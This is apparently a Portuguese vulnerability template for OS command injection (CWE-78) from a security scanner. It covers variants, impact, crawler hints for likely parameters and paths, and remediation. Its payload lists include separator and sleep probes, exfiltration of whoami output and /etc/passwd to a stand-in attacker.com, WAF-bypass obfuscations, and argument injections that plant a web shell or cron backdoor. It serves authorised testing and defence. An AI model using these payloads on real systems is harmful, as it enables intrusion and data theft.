---
id: command_injection
title: "OS Command Injection"
module: "cmdinjection"
severity: "CRITICAL"
cwe_id: "CWE-78"
cwe_title: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
vrt_id: "injection.remote_code_execution.command_injection"
---

## Summary
Entrada do usuário é passada para um shell do sistema operacional sem sanitização, permitindo executar comandos arbitrários, ler arquivos, pivotar na rede e comprometer o servidor.

## Description
Command injection ocorre quando a aplicação monta comandos (`ping`, `nslookup`, `convert`, `ffmpeg`, `git`, `tar`, `curl`) concatenando entrada do usuário. Caracteres de controle (`;`, `|`, `&`, `` ` ``, `$()`, newline) permitem encadear comandos. Variantes:

- **In-band:** saída do comando é refletida na resposta.
- **Blind:** sem saída; confirmação por tempo (`sleep`) ou OOB (DNS/HTTP).
- **Argument injection:** não há shell, mas flags/valores controlam o comportamento do binário (ex.: `--output`, `-o`, `--config`).
- **Second-order:** payload armazenado é usado depois em um comando.

Linguagens com `Runtime.exec`, `ProcessBuilder`, `os.system`, `subprocess` com `shell=True`, `child_process.exec`, `backticks` e `system()` são vetores comuns.

## Impact
- Execução remota de código no servidor (RCE).
- Leitura/escrita de arquivos e exfiltração de dados.
- Instalação de backdoors, mineração e persistência.
- Movimento lateral e acesso a bancos/serviços internos.
- Negação de serviço e destruição de dados.
- Impacto CRITICAL.

## Payloads and Bypasses
```bash
# Separadores básicos
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid
%0d%0aid
%7cid
%26id

# Contexto de host/URL
127.0.0.1; id
127.0.0.1|id
127.0.0.1||id
127.0.0.1&id
127.0.0.1&&id
127.0.0.1%0aid
127.0.0.1%0d%0aid
127.0.0.1`id`
127.0.0.1$(id)

# Blind/time-based
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
127.0.0.1; sleep 5

# OOB
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
; wget http://attacker.com/$(cat /etc/passwd | base64)
; powershell -c "iwr http://attacker.com/$env:USERNAME"
```

WAF bypass:
```bash
# Espaços alternativos
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat%09/etc/passwd
cat</etc/passwd

# Separação sem espaços
{cat,/etc/passwd}
cat$IFS$9/etc/passwd
$IFS$9id

# Ofuscação de comandos
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/???/??t /etc/passwd
$(printf 'id')
`printf 'id'`

# Base64
echo aWQ=|base64 -d|sh
echo aWQ= | base64 --decode | bash

# Variáveis
a=i;b=d;$a$b
```

Argument injection:
```bash
# Ferramentas que aceitam flags perigosas
--output=/var/www/html/shell.php
-o /etc/cron.d/backdoor
--config=http://attacker.com/evil.conf
--upload-pack=id
--checkpoint-action=exec=id
```

Casos reais e mentalidade de ataque (RWBH): Yahoo e Uber (ferramentas de diagnóstico/conversão) mostram injeção em ping/DNS e argument injection; o atacante usa `;`, `|`, `$IFS` e OOB quando a saída é cega.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `cmd`, `exec`, `command`, `ping`, `query`, `host`, `ip`, `domain`, `url`, `filename`, `dir`, `path`, `process`, `system`, `run`, `target`, `address`, `port`.
- **Paths comuns:** `/api/ping`, `/api/dns`, `/api/tools`, `/api/convert`, `/api/export`, `/api/backup`, `/admin/system`, `/diagnostics`, `/webhook`.
- **Sinais:** funcionalidades de ping/DNS/WHOIS; conversão de mídia; backup; erros com saída de shell; atraso com `sleep`; resposta com `uid=`.

## Recommendation
1. Evitar shell: usar APIs nativas (`InetAddress`, bibliotecas de DNS, parsing de imagem) em vez de comandos.
2. Se for inevitável, usar `ProcessBuilder` com lista de argumentos e **não** `shell=True`/`Runtime.exec(String)`; validar cada argumento.
```java
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", validatedHost);
pb.redirectErrorStream(true);
Process p = pb.start();
```
3. Validar entrada com allowlist estrita (IP, hostname RFC, caminho conhecido); rejeitar metacaracteres e espaços.
4. Nunca passar entrada para `sh -c`, `bash -c`, `cmd /c`, `eval`, backticks ou `system`.
5. Aplicar least privilege ao processo, com usuário dedicado, filesystem read-only, seccomp/AppArmor e sem acesso à rede quando possível.
6. Usar filas e workers isolados para operações perigosas; limitar tempo, memória e saída.
7. Monitorar execuções, comandos anômalos e chamadas OOB; alertar.
8. Exemplo Python:
```python
import subprocess, shlex
subprocess.run(["ping", "-c", "1", validated_host], shell=False, timeout=5, check=True)
```
9. Testar com payloads de separadores e OOB em ambiente autorizado.
